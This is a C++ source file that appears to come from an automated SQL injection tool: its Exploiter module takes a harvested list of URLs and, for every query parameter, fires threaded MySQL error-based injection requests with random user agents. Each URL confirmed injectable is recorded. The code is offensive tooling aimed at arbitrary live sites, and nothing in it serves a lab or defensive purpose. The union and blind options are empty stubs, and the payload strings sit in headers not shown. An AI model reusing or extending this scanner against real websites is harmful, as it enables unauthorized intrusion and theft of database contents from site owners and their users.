//
// Created by zerte on 5/3/2020.
//
#include "Exploiter.h"
#include <injection/mysql/Error.h>
#include <injection/mysql/Queries.h>
#include <ppl.h>
#include <pplcancellation_token.h>
#include <concurrent_unordered_map.h>

#include <utility>

using namespace Modules;

Exploiter::Exploiter() = default;

void Exploiter::run() {
    this->SetRunning(true);
    _timer = std::chrono::system_clock::now();
    _pool = new ThreadPool(Settings::GetInt("core.threads"));
    //_output.open("injectables.txt", std::fstream::app);
    Globals::ResetCounters();
    Globals::SetEnd(Globals::GetUrlCount());
    Globals::SetStatus(EXPLOITING);
    std::thread a([&]() {
        for (const auto &url : Globals::GetUrls()) {
            Poco::URI u(url);
            if (u.getQueryParameters().empty())
                continue;

            auto res = PManager->TestLivingUrl(u);

            concurrency::cancellation_token_source source;

            for (auto & flag : Injection::MySQL::_flags) {
                if (res.find(flag) != std::string::npos) {
                    goto Done;
                }
            }

            for (int param = 0; param != u.getQueryParameters().size(); param++) {
                for (int mod = 0; mod != Injection::MySQL::_modulators.size()-1; mod++) {
                    switch (Settings::GetInt("exploiter.intensity")) {
                        case 0:
                            if (mod > 15)
                                goto Done;
                        case 1:
                            if (mod > 25)
                                goto Done;
                    }


                    if (Settings::GetBool("exploiter.err")) {
                        for (int vec = 0; vec != Injection::MySQL::Error::_vectors.size()-1; vec++) {
                            for (int andor = 0; andor < 2; andor++) {
                                if (source.get_token().is_canceled()) {
                                    goto Done;
                                }

                                this->_pool->AddJob([this, url, u, param, vec, mod, andor, &source]() {
                                    //try {
                                        if (!source.get_token().is_canceled() && CheckForInjection(PManager->Handle(Request(Injection::BuildInjectionQuery(u, param, Injection::IERR,
                                                                                                                                                        Injection::MYSQL,
                                                                                                                                                        vec, mod,
                                                                                                                                                        Injection::MySQL::_queries[0],
                                                                                                                                                        andor),
                                                                                                                         Utils::random_ua())))) {
                                            source.cancel();
                                            Globals::AddInjection(
                                                    Injection::Injectable(u, param, Injection::IERR,
                                                                          Injection::MYSQL, vec,
                                                                          mod));

                                        }
                                    //} catch (...) {}

                                });
                            }
                        }
                    }

                    if (Settings::GetBool("exploiter.uni")) {

                    }

                    if (Settings::GetBool("exploiter.bli")) {

                    }
                }
            }
            Done:
            Globals::IncreaseIndex(1);
        }
        this->_pool->WaitAll();
        Globals::SetStatus(IDLE);
        Exploiter::GetInstance()->Stop();
    });
    a.detach();
}

bool Exploiter::CheckForInjection(std::string resp) {
    auto a = Utils::ExtractValue(std::move(resp));
    return a == "1";
}

bool Exploiter::CheckJobDone(const std::string& host) {
    for (auto & u : Globals::GetInjectables()) {
        if (u.GetUrl().getHost() == host) {
            return true;
        }
    }
    return false;
}
